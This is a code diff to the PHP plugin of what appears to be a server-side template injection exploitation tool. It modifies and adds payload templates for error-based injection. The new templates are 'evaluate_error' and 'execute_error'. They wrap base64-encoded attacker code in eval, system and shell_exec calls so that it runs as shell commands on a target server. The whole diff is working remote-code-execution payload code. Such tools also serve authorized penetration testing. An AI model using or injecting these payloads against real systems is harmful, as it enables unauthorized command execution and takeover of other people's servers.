@@ -28,10 +28,10 @@ class Php(Plugin):
             'render_error': {
                 'call': 'inject',
                 'render': """{code}""",
-                # "Y:/A:/" is a file path that is unlikely to exist
-                'header': """fopen("Y:/A:/".strval({header[0]}+{header[1]}).rtrim(strval(""",
-                'trailer': """)).strval({trailer[0]}+{trailer[1]}),"r");""",
-                'test_render': f'strval({rand.randints[0]}+{rand.randints[1]})',
+                # "abc"() tries to call function abc
+                'header': """(strval({header[0]}+{header[1]}).rtrim(strval(""",
+                'trailer': """)).strval({trailer[0]}+{trailer[1]}))();""",
+                'test_render': f'{rand.randints[0]}+{rand.randints[1]}',
                 'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
             },
             'write': {
@@ -53,11 +53,21 @@ class Php(Plugin):
                 'test_os': 'echo PHP_OS;',
                 'test_os_expected': r'^[\w-]+$'
             },
+            'evaluate_error': {
+                # Dirty hack from Twig
+                'call': 'execute',
+                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
+            },
             'execute': {
                 'call': 'evaluate',
                 'execute': """$d="{code_b64}";system(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)));""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2] 
+            },
+            'execute_error': {
+                'call': 'render',
+                # Using shell_exec to get full output
+                'execute': """shell_exec(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))"""
             },
             'blind': {
                 'call': 'evaluate_blind',
